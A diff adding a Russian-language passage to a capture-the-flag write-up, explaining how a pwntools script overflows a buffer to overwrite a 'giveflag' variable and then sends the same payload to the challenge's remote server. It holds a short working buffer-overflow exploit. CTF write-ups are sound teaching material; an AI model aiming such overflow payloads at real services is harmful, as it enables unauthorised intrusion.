@@ -48,4 +48,22 @@ p.sendline(b"A"*264 + b"Yesss!")
 p.interactive()
 
 ```
+ Данный скрипт заполняет полностью массив `word` и перезаписывает переменную `giveflag`. Проверим работу скрипта: 
+ ![image](https://github.com/user-attachments/assets/e9528abd-343f-4b5f-98d0-9a4f8efaee69)
+
+ Локальный флаг получен. Перепишем скрипт и получим настоящий флаг:
+ 
+```py
+#!/usr/bin/env python3
+from pwn import *
+
+
+p = remote('109.233.56.90', 11584)
+p.sendline(b"A"*264 + b"Yesss!")
+p.interactive()
+
+```
+
+![image](https://github.com/user-attachments/assets/a3bd7f15-37a7-457e-875a-42091c3f2a00)
+
 
